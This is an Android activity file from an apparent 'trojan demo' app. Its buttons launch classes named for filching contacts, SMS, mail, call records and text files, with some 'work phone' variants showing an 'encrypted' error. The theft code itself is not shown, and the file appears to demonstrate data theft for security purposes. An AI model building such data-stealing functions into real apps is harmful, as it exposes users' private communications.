package com.singuloid.trojandemo;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import com.singuloid.trojandemo.utils.DBHelper;


public class MainActivity extends Activity implements View.OnClickListener {

    private static final String TAG = "MainActivity";
    private Button mContacts, mContacts2, mText, mText2, mMail, mMail2, mCallRecords, mCallRecords2, mTxt, mTxt2, mRenRen;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
    }

    private void initView() {
        mContacts = (Button) findViewById(R.id.contacts);
        mContacts2 = (Button) findViewById(R.id.contacts2);
        mText = (Button) findViewById(R.id.text);
        mText2 = (Button) findViewById(R.id.text2);
        mMail = (Button) findViewById(R.id.mail);
        mCallRecords = (Button) findViewById(R.id.call_records);
        mContacts.setOnClickListener(this);
        mContacts2.setOnClickListener(this);
        mText.setOnClickListener(this);
        mText2.setOnClickListener(this);
        mMail.setOnClickListener(this);
        mCallRecords.setOnClickListener(this);
        mMail2 = (Button) findViewById(R.id.mail2);
        mMail2.setOnClickListener(this);
        mCallRecords2 = (Button) findViewById(R.id.call_records2);
        mCallRecords2.setOnClickListener(this);
        mTxt = (Button) findViewById(R.id.txt);
        mTxt.setOnClickListener(this);
        mTxt2 = (Button) findViewById(R.id.txt2);
        mTxt2.setOnClickListener(this);
//        mRenRen = (Button) findViewById(R.id.renren);
//        mRenRen.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        Intent textIntent = new Intent(this, FilchText.class);
        switch (v.getId()) {
            case R.id.contacts:
                startActivity(new Intent(this, FilchContacts.class));
                break;
            case R.id.contacts2:
                dialog("联系人");
                break;
            case R.id.text:
                textIntent.putExtra("isWorkPhone", false);
                startActivity(textIntent);
                break;
            case R.id.text2:
                textIntent.putExtra("isWorkPhone", true);
                startActivity(textIntent);
//                dialog("短信");
                break;
            case R.id.mail:
                Intent mailIntent = new Intent(this, FilchFiles.class);
                mailIntent.putExtra("type", "mail");
                startActivity(mailIntent);
                break;
            case R.id.mail2:
                Intent mailIntent2 = new Intent(this, FilchFiles.class);
                mailIntent2.putExtra("type", "mail");
                startActivity(mailIntent2);
                break;
            case R.id.call_records:
                Intent call_intent = new Intent(this, FilchCallRecords.class);
                call_intent.putExtra("isWorkPhone", false);
                startActivity(call_intent);
                break;
            case R.id.call_records2:
                Intent call_intent2 = new Intent(this, FilchCallRecords.class);
                call_intent2.putExtra("isWorkPhone", true);
                startActivity(call_intent2);
                break;
            case R.id.txt:
                Intent txtIntent = new Intent(this, FilchFiles.class);
                txtIntent.putExtra("type", "txt");
                startActivity(txtIntent);
                break;
            case R.id.txt2:
                startActivity(new Intent(this, OpenNotepadOnWosFile.class));
                break;
//            case R.id.renren:
//                DBHelper helper = new DBHelper(this);
//                helper.queryAccount();
//                break;
        }
    }

    private void dialog(String str) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("ERROR");
        builder.setMessage("打开" + str + "时发生错误:" + " files is encrypted or database can not be opened");
        builder.setNeutralButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });
        builder.create().show();
    }
}
